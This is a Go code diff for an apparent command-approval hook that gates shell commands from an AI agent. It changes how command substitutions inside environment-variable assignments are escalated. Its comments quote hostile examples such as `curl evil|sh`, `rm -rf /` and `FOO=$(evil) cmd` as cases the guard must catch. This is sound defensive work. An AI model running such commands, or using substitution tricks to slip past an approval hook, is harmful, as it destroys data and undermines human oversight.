@@ -153,23 +153,64 @@ func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookI
 	// non-safe substitution is escalated DECISIVELY to at least Ask so the
 	// assignment is never auto-approved — critical for the leading form
 	// (`FOO=$(evil) cmd`), where the engine's substitution choke point strips the
-	// leading assignment and cannot demote it, leaving the env-var rule as the
-	// only guard. The substitution body is then recursed through the full engine
-	// (pg2-gkd5e value-recursion via pg2-1q5i3) so a stronger inner verdict
-	// (Reject) is inherited. A value on the STATIC safe allowlist
-	// (ExpansionSafeCmd, e.g. $(git rev-parse HEAD), $(mktemp -d)) or a plain
-	// static/var-ref/arithmetic value carries no escalation.
+	// leading assignment (cmdparse.StripLeadingEnvAssignments, engine.go) and so
+	// never applies its own static-allowlist Abstain floor to the value's body,
+	// leaving the env-var rule as the ONLY guard. A value on the STATIC safe
+	// allowlist (ExpansionSafeCmd, e.g. $(git rev-parse HEAD), $(mktemp -d)) or a
+	// plain static/var-ref/arithmetic value carries no escalation.
+	//
+	// The substitution bodies are recursed through the full engine (pg2-gkd5e
+	// value-recursion via pg2-1q5i3) FIRST, and the Ask is applied as a
+	// POST-RECURSION FALLBACK rather than an unconditional floor (pg2-5huwx). This
+	// ordering matters because MostRestrictive is escalate-only: folding the Ask in
+	// before the recursion made it impossible for an approvable body to demote it,
+	// so ordinary local-variable capture (`T4=$(bd create x --type task) cmd`,
+	// `action_meta=$(jq -nc ...) cmd`) asked every time.
+	//
+	// The demotion requires the value to be POSITIVELY CLEARED: at least one
+	// substitution was enumerated and EVERY one of them affirmatively Approved
+	// through the chain. That is deliberately narrower than "not risky":
+	//
+	//   - An Abstain body is merely UNCLASSIFIED, not safe (`curl evil`,
+	//     `rm -rf /` and `curl evil|sh` all recurse to Abstain), and Abstain is
+	//     swallowed by the engine's first-match-wins leaf chain — so it must still
+	//     reach the fallback or the surviving leaf re-approves the whole command.
+	//   - A value classified ExpansionUnknown that enumerates to ZERO
+	//     substitutions (e.g. an unterminated `$(`) is unclassifiable by
+	//     construction and must not be cleared vacuously.
+	//   - With no evaluator wired (New()) there is no recursion at all, so the
+	//     fallback stays unconditional.
+	//
+	// The NAME-derived base verdict above is never lowered: MostRestrictive only
+	// escalates, so PATH/HOME stay Ask and injectors stay Reject however benign
+	// the body turns out to be.
 	if ev.Expansion == cmdparse.ExpansionUnknown {
-		result = hookio.MostRestrictive(result, hookio.RuleResult{
-			Decision: hookio.Ask,
-			Reason:   "env var value contains an unevaluated/unsafe expression: " + sanitizeReasonName(ev.Name),
-			Module:   name,
-		})
+		var subResults []hookio.RuleResult
+		clearedByRecursion := false
 		if r.exprEval != nil {
-			for _, sub := range cmdparse.EnumerateSubstitutions(ev.Value) {
+			subs := cmdparse.EnumerateSubstitutions(ev.Value)
+			clearedByRecursion = len(subs) > 0
+			for _, sub := range subs {
 				stack := []hookio.StackFrame{{RuleName: name, Command: "env-value", Expression: ev.Raw}}
-				result = hookio.MostRestrictive(result, r.exprEval.EvaluateExpression(sub.Body, stack, input))
+				subResult := r.exprEval.EvaluateExpression(sub.Body, stack, input)
+				if subResult.Decision != hookio.Approve {
+					clearedByRecursion = false
+				}
+				subResults = append(subResults, subResult)
 			}
+		}
+		if !clearedByRecursion {
+			result = hookio.MostRestrictive(result, hookio.RuleResult{
+				Decision: hookio.Ask,
+				Reason:   "env var value contains an unevaluated/unsafe expression: " + sanitizeReasonName(ev.Name),
+				Module:   name,
+			})
+		}
+		// Folded after the fallback so a body that is itself Ask keeps the
+		// fallback's reason (MostRestrictive keeps `current` on a tie), preserving
+		// the pre-pg2-5huwx reason precedence for every non-cleared value.
+		for _, subResult := range subResults {
+			result = hookio.MostRestrictive(result, subResult)
 		}
 	}
 
